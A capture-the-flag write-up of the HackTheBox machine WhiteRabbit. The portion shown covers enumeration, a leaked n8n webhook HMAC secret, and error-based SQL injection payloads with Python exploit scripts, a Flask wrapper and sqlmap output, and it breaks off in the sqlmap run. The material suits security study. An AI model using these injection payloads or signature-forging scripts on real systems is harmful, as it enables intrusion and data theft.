---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Insane
  - VirtualHosts
  - VHOST
  - Subdomain
  - UptimeKuma
  - DirectoryBusting
  - n8n
  - SQLInjection
  - SQLi
  - ErrorBased
  - ExploitDevelopment
  - Webhooks
  - sqlmap
  - restic
  - Hash
  - Hashes
  - Cracking
  - hashcat
  - 7-Zip
  - 7z
  - Docker
  - Container
  - Snapshots
  - ReverseEngineering
  - Ghidra
  - PasswordGenerator
  - CustomWordlist
  - BruteForcing
  - Hydra
---

![](images/WhiteRabbit.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Virtual Host Enumeration](#Virtual-Host-Enumeration)
- [status.whiterabbit.htb](#statuswhiterabbithtb)
    - [Directory Busting](#Directory-Busting)
    - [status.whiterabbit.htb/status/temp](#statuswhiterabbithtb-status-temp)
- [ddb09a8558c9.whiterabbit.htb](#ddb09a8558c9whiterabbithtb)
- [a668910b5514e.whiterabbit.htb](#a668910b5514ewhiterabbithtb)
- [Error-based SQL Injection (SQLi)](#Error-based-SQL-Injection-SQLi)
    - [Signature Creation](#Signature-Creation)
    - [Payload Development](#Payload-Development)
        - [Payloads](#Payloads)
        - [Responses](#Responses)
    - [Exploitation](#Exploitation)
    - [Automation with sqlmap](#Automation-with-sqlmap)
        - [Flask Wrapper to use Webhooks](#Flask-Wrapper-to-use-Webhooks)
        - [Sending Payloads](#Sending-Payloads)
- [Foothold](#Foothold)
    - [75951e6ff.whiterabbit.htb](#75951e6ffwhiterabbithtb)
        - [restic Access](#restic-Access)
    - [Cracking the password-protected Archive using hashcat](#Cracking-the-password-protected-Archive-using-hashcat)
    - [Extracting 7-Zip Archive](#Extracting-7-Zip-Archive)
    - [SSH Access as bob](#SSH-Access-as-bob)
- [Enumeration (bob)](#Enumeration-bob)
- [Privilege Escalation to morpheus](#Privilege-Escalation-to-morpheus)
    - [Abusing restic Snapshots](#Abusing-restic-Snapshots)
- [user.txt](#usertxt)
- [Enumeration (morpheus)](#Enumeration-morpheus)
- [Reverse Engineering neo-password-generator](#Reverse-Engineering-neo-password-generator)
    - [Main Function](#Main-Function)
    - [Local Variables](#Local-Variables)
    - [Timestamp-based Seed](#Timestamp-based-Seed)
    - [Stack Canary Check](#Stack-Canary-Check)
    - [Conclusion](#Conclusion)
- [Wordlist Generator](#Wordlist-Generator)
- [Privilege Escalation to neo](#Privilege-Escalation-to-neo)
    - [Brute Force using Hydra and custom Wordlist](#Brute-Force-using-Hydra-and-custom-Wordlist)
- [Enumeration (neo)](#Enumeration-neo)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Summary

At the start the initial `port scan` using `Nmap` reveals not only the expected port `22/TCP` and port `80/TCP`, it also shows port `2222/TCP` which is an indicator for the presence of a `containerized application`. It also shows a redirect to `whiterabbit.htb`. 

Since the `website` is only giving a few vague hints about the fictional penetration testing company and corresponding infrastructure and because of the `redirect`, the next logical step is to go for `Virtual Host (VHOST) Enumeration` to find a `subdomain` called `status.whiterabbit.htb`.

It runs an application called `Uptime Kuma` which does basically uptime monitoring for systems. Following the results of an `directory busting` approach reveals a `/status/temp` endpoint. On the endpoint are two more `subdomains` configured for uptime monitoring.

One of them an instance of `GoPhish` and the second one is a `wiki` running on `Wiki.js`. It contains useful information about the underlying `n8n` infrastructure and a `.json file` with `SQL statements` and a `secret` in order to work with `n8n`. It utilizes a `custom header` to pass `statements` and `instructions` and to `communicate` via `webhooks`.

By crafting a `custom exploit` it is possible to achieve `Error-based SQL Injection (SQLi)` using `sqlmap` and to dump a `command history` from the `back-end database`.

The `dump` shows another `secret` to interact with a `restic` endpoint and it's corresponding `subdomain`. By using `restic` in combination with the `secret` a `7-Zip archive` can be restored and downloaded. The archive is `password-protected` which requires `7z2john` in order to generate a `hash` which can be then `cracked` using `hashcat`.

The archive contains an `SSH key pair` for the user `bob` which grants access to the `Docker container` running `SSH` on port `2222/TCP` as `foothold`.

To `escalate privilges` to `root` inside the `container`, `restic` comes into play once again. The `snapshot option` allows to `backup` arbitrary directories and so the one for `root` because `bob` is allowed to run the binary using `sudo`.

From the `snapshot` is is possible to retrieve another `SSH key` but this time for a user called `morpheus` on the box itself.

With a session as `morpheus` the `user.txt` can be finally obtained.

To `escalate privileges` even further to the user `neo`, a binary called `neo-password-generator` located within `/opt/` needs to be `reverse engineered` to create a `custom wordlist` to `brute force` the `password` using `Hydra`.

As last step all what is left is to abuse the `(ALL : ALL) ALL` configuration for `sudo` as `neo` to gain `root` on the box and to grab the `root.txt`.

## Reconnaissance

### Port Scanning

The box started with the typical port `22/TCP` and port `80/TCP` open as well as an additional `SSH port` on port `2222/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.234.57
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 21:01 CEST
Nmap scan report for 10.129.234.57
Host is up (0.013s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-title: Did not follow redirect to http://whiterabbit.htb
|_http-server-header: Caddy
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

Since the output of `Nmap` already showed us the `redirect` to `whiterabbit.htb` we added this to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.234.57   whiterabbit.htb
```

### Enumeration of Port 80/TCP

As next step after the initial port scan we moved to the `website` running on port `80/TCP` and found information about penetration testing services, a GoPhish phishing instances and bit more information related to the infrastructure of this fictional company.

- [http://whiterabbit.htb/](http://whiterabbit.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://whiterabbit.htb/
http://whiterabbit.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.129.234.57], Script, Title[White Rabbit - Pentesting Services]
```

![](images/2025-04-05_21-03_80_website.png)

### Virtual Host Enumeration

Since we had a domain working we could work with we decided to perform a quick `Virtual Host (VHOST) Enumeration` while we took a closer look at the website.

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.whiterabbit.htb" -u http://whiterabbit.htb/ --fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 17ms]
:: Progress: [151265/151265] :: Job [1/1] :: 45 req/sec :: Duration: [0:15:40] :: Errors: 7 ::
```

And indeed we found `status.whiterabbit.htb` which we also added to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.234.57   whiterabbit.htb
10.129.234.57   status.whiterabbit.htb
```

## status.whiterabbit.htb

The `subdomain` displayed the `login panel` of an open source uptime monitoring solution called `Uptime Kuma`.

- [http://status.whiterabbit.htb/](http://status.whiterabbit.htb/)
- [https://github.com/louislam/uptime-kuma](https://github.com/louislam/uptime-kuma)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://status.whiterabbit.htb/dashboard
http://status.whiterabbit.htb/dashboard [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.129.234.57], Script[module], Title[Uptime Kuma], X-Frame-Options[SAMEORIGIN]
```

![](images/2025-04-05_21-09_80_vhost_kuma_login.png)

### Directory Busting

We had no credentials found so far to login and `default credentials` as well as typical combinations like `admin:admin` didn't worked so we moved on with `directory busting` to see if we could find any interesting `endpoints`.

```shell
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://status.whiterabbit.htb/

  _|. _ _  _  _  _ _|_    v0.4.3                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_status.whiterabbit.htb/__25-04-05_21-24-58.txt

Target: http://status.whiterabbit.htb/

[21:24:58] Starting:                                                             
[21:25:41] 301 -  179B  - /assets  ->  /assets/                             
[21:26:03] 200 -   15KB - /favicon.ico                                      
[21:26:19] 200 -  415B  - /manifest.json                                    
[21:26:21] 401 -    0B  - /metrics                                          
[21:26:21] 401 -    0B  - /metrics/                                         
[21:26:38] 200 -   25B  - /robots.txt                                       
[21:26:39] 301 -  189B  - /screenshots  ->  /screenshots/                   
[21:26:45] 404 -    2KB - /status                                           
[21:26:46] 404 -    2KB - /status?full=true                                 
[21:26:46] 404 -    2KB - /status/                                          
[21:26:52] 301 -  179B  - /upload  ->  /upload/                             
[21:26:52] 404 -   15B  - /upload/1.php                                     
[21:26:52] 404 -   15B  - /upload/2.php
[21:26:52] 404 -   15B  - /upload/b_user.csv
[21:26:52] 404 -   15B  - /upload/loginIxje.php
[21:26:52] 404 -   15B  - /upload/test.php
[21:26:52] 404 -   15B  - /upload/upload.php                                
[21:26:52] 404 -   15B  - /upload/test.txt
[21:26:52] 301 -  179B  - /Upload  ->  /Upload/                             
[21:26:52] 404 -   15B  - /upload/                                          
[21:26:52] 404 -   15B  - /upload/b_user.xls
                                                                             
Task Completed
```

While we digged deeper into the `folders` we found we got a hit on `/status/temp`.

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://status.whiterabbit.htb/status/ 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb/status/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/temp                 (Status: 200) [Size: 3359]
```

### status.whiterabbit.htb/status/temp

On `status.whiterabbit.htb/status/temp` we found an `open status board` which revealed more `virtual hosts` for investigation.

- [http://status.whiterabbit.htb/status/temp](http://status.whiterabbit.htb/status/temp)

![](images/2025-04-05_21-43_80_vhost_kuma_status_temp.png)

```c
gophish (ddb09a8558c9.whiterabbit.htb)
n8n [Production]
website (whiterabbit.htb)
wikijs (a668910b5514e.whiterabbit.htb) [DEV]
```

And one more time we updated our `/etc/hosts` file in order to access the newly found `subdomains`.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.234.57   whiterabbit.htb
10.129.234.57   status.whiterabbit.htb
10.129.234.57   ddb09a8558c9.whiterabbit.htb
10.129.234.57   a668910b5514e.whiterabbit.htb
```

## ddb09a8558c9.whiterabbit.htb

We started with `ddb09a8558c9.whiterabbit.htb` which hosted an instance of `GoPhish`. But unfortunately there was not much to do for us here at this point. So we moved on.

- [http://ddb09a8558c9.whiterabbit.htb/](http://ddb09a8558c9.whiterabbit.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://ddb09a8558c9.whiterabbit.htb/
http://ddb09a8558c9.whiterabbit.htb/ [307 Temporary Redirect] Cookies[_gorilla_csrf], Country[RESERVED][ZZ], HTTPServer[Caddy], HttpOnly[_gorilla_csrf], IP[10.129.234.57], RedirectLocation[/login?next=%2F], UncommonHeaders[content-security-policy], X-Frame-Options[DENY]
http://ddb09a8558c9.whiterabbit.htb/login?next=%2F [200 OK] Cookies[_gorilla_csrf,gophish], Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], HttpOnly[_gorilla_csrf,gophish], IP[10.129.234.57], Meta-Author[Jordan Wright (http://github.com/jordan-wright)], PasswordField[password], Script, Title[Gophish - Login], UncommonHeaders[content-security-policy], X-Frame-Options[DENY], X-UA-Compatible[IE=edge]
```

![](images/2025-04-05_21-48_80_vhost_gophish.png)

## a668910b5514e.whiterabbit.htb

Next we checked `a668910b5514e.whiterabbit.htb` and found a `wiki` running on `Wiki.js`.

- [http://a668910b5514e.whiterabbit.htb/](http://a668910b5514e.whiterabbit.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://a668910b5514e.whiterabbit.htb/ 
http://a668910b5514e.whiterabbit.htb/ [200 OK] Content-Language[en], Country[RESERVED][ZZ], HTML5, HTTPServer[Caddy], IP[10.129.234.57], Open-Graph-Protocol[website], Script[text/javascript], Title[White Rabbit - Wiki | Wiki.js], UncommonHeaders[referrer-policy,x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

![](images/2025-04-05_21-57_80_vhost_wikijs.png)

The `documentation` about the `GoPhish Webhooks` revealed a `gophish_to_phishing_score_database.json` file in order to work with the `n8n` instance in the background.

- [http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json](http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json)
- [https://github.com/n8n-io/n8n](https://github.com/n8n-io/n8n)

![](images/2025-04-05_22-23_80_wikijs_phishing_score_database.png)

We grabbed the `example request` and added the `host` of `28efa8f7df.whiterabbit.htb` to our `/etc/hosts` file as well. At this point there was a scheme to it.

```console
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}
```

| Host                       |
| -------------------------- |
| 28efa8f7df.whiterabbit.htb |

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.234.57   whiterabbit.htb
10.129.234.57   status.whiterabbit.htb
10.129.234.57   ddb09a8558c9.whiterabbit.htb
10.129.234.57   a668910b5514e.whiterabbit.htb
10.129.234.57   28efa8f7df.whiterabbit.htb
```

After that we searched for useful information within the `.json` file and found some `SQL statements` as well as a `secret`.

```json
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat gophish_to_phishing_score_database.json 
{
  "name": "Gophish to Phishing Score Database",
  "nodes": [
<--- CUT FOR BREVITY --->
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;",
        "options": {
          "queryReplacement": "={{ $json.email }}"
        }
      },
      "id": "e83be7d7-0c4a-4ca8-b341-3a40739f8825",
      "name": "Update Phishing Score for Clicked Event",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        2360,
        340
      ],
<--- CUT FOR BREVITY --->
    {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    },
<--- CUT FOR BREVITY --->
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
        "options": {}
      },
      "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
      "name": "Get current phishing score",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        1380,
        260
      ],
      "alwaysOutputData": true,
      "retryOnFail": false,
      "executeOnce": false,
      "notesInFlow": false,
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      },
      "onError": "continueErrorOutput"
    },
<--- CUT FOR BREVITY --->
```

| Secret                           |
| -------------------------------- |
| 3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS |

## Error-based SQL Injection (SQLi)

### Signature Creation

We played a bit with the `example request` and noticed that we needed a `valid siganture` in order to get our requests accepted.

Therefore we created a small `Python script` to create a `signature` for testing.

```python
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat signature.py 
import hmac, hashlib, json

secret = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
body = {
    "email": "victim@example.com",
    "message": "Clicked Link"
}
body_str = json.dumps(body, separators=(',', ':'))
sig = hmac.new(secret, body_str.encode(), hashlib.sha256).hexdigest()
print("sha256=" + sig)
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 signature.py 
sha256=16124448ccdca499352857c29e5683e9095b92ebd8b668f9f6e1292b2d48d5e5
```

### Payload Development

#### Payloads

From the output of the `.json` file we assumed that our best bet would be a potential `SQL Injection (SQLi)` and so we started to search for the point where we could `inject` some `payloads`.

Below is a bit of the process what we went through until we were confident that we could `leak information` from the `database`.

```console
{ "email": "\" OR 1=1 -- ", "message": "Clicked Link" }
```

```console
"email": "\" AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) -- "
```

```console
"email": "\" UNION SELECT 1 -- "
```

```console
"email": "\" UNION SELECT 1,2 -- "
```

```console
"email": "\" UNION SELECT 1,2,(SELECT GROUP_CONCAT(email,0x3a,phishing_score) FROM victims),4 -- "
```

```console
"email": "\" UNION SELECT 1,2,(SELECT GROUP_CONCAT(email,0x3a,phishing_score) FROM victims),4,5 -- "
```

So we developed the `exploit.py` below and replaced the `payloads` while testing.

```python
import json
import hmac
import hashlib
import requests

TARGET = "http://28efa8f7df.whiterabbit.htb"
WEBHOOK_PATH = "/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

payload = {
    "email": "\" UNION SELECT 1,(SELECT GROUP_CONCAT(email,0x3a,phishing_score) FROM victims) -- ",
    "message": "Clicked Link"
}

body_str = json.dumps(payload, separators=(',', ':'))  # must match exactly
sig = hmac.new(SECRET, body_str.encode(), hashlib.sha256).hexdigest()
signature_header = f"sha256={sig}"

headers = {
    "Content-Type": "application/json",
    "x-gophish-signature": signature_header,
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

print("[*] Sending payload to webhook with injected email...")
print(f"[*] POST {TARGET}{WEBHOOK_PATH}")
print(f"[*] Signature: {signature_header}\n")

response = requests.post(
    f"{TARGET}{WEBHOOK_PATH}",
    headers=headers,
    data=body_str
)

print(f"[+] Status Code: {response.status_code}")
print("[+] Response Body:")
print(response.text.strip())
```

#### Responses

The results started to change to what we considered an `Error-based SQL Injection`. It basically went from `Info: User is not in database` as response to an actual `error message` until we ended up with `code: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 exploit.py
[+] 404 - <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d</pre>
</body>
</html>
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 exploit.py
[*] Sending payload to webhook with injected email...
[*] POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[*] Signature: sha256=2aea7b41ef88582e13149695a6d52169e3cd66677a2d77bfcde0804e65e96ed0

[+] Status Code: 200
[+] Response Body:
Info: User is not in database
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 exploit.py
[*] Sending payload to webhook with injected email...
[*] POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[*] Signature: sha256=7f5bcbd1c287fab86095bb34c1b00d5556e7cb0eadda59ff2034c1806f50db8d

[+] Status Code: 200
[+] Response Body:
XPATH syntax error: '~phishing~' | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1743886715271,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"\" AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) -- \" LIMIT 1, code: ER_UNKNOWN_ERROR"}
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 exploit.py
[*] Sending payload to webhook with injected email...
[*] POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[*] Signature: sha256=d810493ba44981f1214fb13c1768de3f6799f3f1c9ff71f5258659485e2874bb

[+] Status Code: 200
[+] Response Body:
The used SELECT statements have a different number of columns | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1743886856001,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"\" UNION SELECT 1 -- \" LIMIT 1, code: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT"}
```

### Exploitation

The final `payload` and `Python script` we decided to go ahead with was the following ones.

```console
"email": f"\" AND updatexml(1,concat(0x7e,(SELECT email FROM victims LIMIT {i},1),0x7e),1) -- "
```

```python
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat exploit.py
import json
import hmac
import hashlib
import requests

TARGET = "http://28efa8f7df.whiterabbit.htb"
WEBHOOK_PATH = "/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

payload = {
    "email": "\" AND updatexml(1,concat(0x7e,(SELECT email FROM victims LIMIT 1),0x7e),1) -- ",
    "message": "Clicked Link"
}

body_str = json.dumps(payload, separators=(',', ':'))  # must match exactly
sig = hmac.new(SECRET, body_str.encode(), hashlib.sha256).hexdigest()
signature_header = f"sha256={sig}"

headers = {
    "Content-Type": "application/json",
    "x-gophish-signature": signature_header,
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

print("[*] Sending payload to webhook with injected email...")
print(f"[*] POST {TARGET}{WEBHOOK_PATH}")
print(f"[*] Signature: {signature_header}\n")

response = requests.post(
    f"{TARGET}{WEBHOOK_PATH}",
    headers=headers,
    data=body_str
)

print(f"[+] Status Code: {response.status_code}")
print("[+] Response Body:")
print(response.text.strip())
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 exploit.py
[*] Sending payload to webhook with injected email...
[*] POST http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d
[*] Signature: sha256=8a3ed4f8f42f311d1f950695584e49ab8fca407332c1ac184a37d5327786d651

[+] Status Code: 200
[+] Response Body:
XPATH syntax error: '~test1@example.com~' | {"level":"error","tags":{},"context":{"itemIndex":0},"functionality":"regular","name":"NodeOperationError","timestamp":1743887485892,"node":{"parameters":{"resource":"database","operation":"executeQuery","query":"SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1","options":{}},"id":"5929bf85-d38b-4fdd-ae76-f0a61e2cef55","name":"Get current phishing score","type":"n8n-nodes-base.mySql","typeVersion":2.4,"position":[1380,260],"alwaysOutputData":true,"retryOnFail":false,"executeOnce":false,"notesInFlow":false,"credentials":{"mySql":{"id":"qEqs6Hx9HRmSTg5v","name":"mariadb - phishing"}},"onError":"continueErrorOutput"},"messages":[],"obfuscate":false,"description":"sql: SELECT * FROM victims where email = \"\" AND updatexml(1,concat(0x7e,(SELECT email FROM victims LIMIT 1),0x7e),1) -- \" LIMIT 1, code: ER_UNKNOWN_ERROR"}
```

### Automation with sqlmap

#### Flask Wrapper to use Webhooks

Now with a working payload we decided to `automate` the part of `exploitation` and therefore `ethicxz` came up with the idea of a wrapper in order to work the `Webhooks`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ cat exploit.py 
from flask import Flask, request, jsonify
import hmac
import hashlib
import requests
import json

app = Flask(__name__)

key = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
webhook_url = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
base_payload = {
    "campaign_id": 1,
    "message": "Clicked Link"
}

def generate_hmac_signature(payload):

    payload_string = json.dumps(payload, separators=(',', ':'))
    return hmac.new(key, payload_string.encode(), hashlib.sha256).hexdigest()

@app.route('/send_webhook', methods=['GET'])
def send_webhook():
    email = request.args.get('email')

    if not email:
        return jsonify({"error": "Email parameter is required"}), 400

    if "'" in email or ";" in email:
        return jsonify({"error": "Potential SQL injection detected"}), 400

    payload = base_payload.copy()
    payload['email'] = email

    signature = generate_hmac_signature(payload)

    headers = {
        'x-gophish-signature': f'sha256={signature}',
        'Content-Type': 'application/json'
    }

    try:
        response = requests.post(webhook_url, json=payload, headers=headers)
        return jsonify({"status": "Request sent", "webhook_response": response.text}), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Failed to send request: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)
```

#### Sending Payloads

We started the updated `exploit.py` and used `sqlmap` to send payloads through it to the application.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/WhiteRabbit/files]
└─$ python3 exploit.py
 * Serving Flask app 'exploit'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 107-347-873
<--- CUT FOR BREVITY --->
127.0.0.1 - - [06/Apr/2025 07:36:13] "GET /send_webhook?email=test@ex.com"%20AND%20(SELECT%209470%20FROM(SELECT%20COUNT(*),CONCAT(0x716a707071,(SELECT%20(CASE%20WHEN%20(VERSION()%20LIKE%200x254d61726961444225)%20THEN%201%20ELSE%200%20END)),0x7176767171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20tDtr HTTP/1.1" 200 -
```

```shell
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://127.0.0.1:5000/send_webhook\?email\=test@ex.com --batch --level=5 --risk=3
        ___
       __H__                                                                     
 ___ ___[)]_____ ___ ___  {1.9.2#stable}                                         
|_ -| . [)]     | .'| . |                                                        
|___|_  ["]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:34:36 /2025-04-06/

[07:34:36] [INFO] testing connection to the target URL
[07:34:36] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:34:36] [INFO] testing if the target URL content is stable
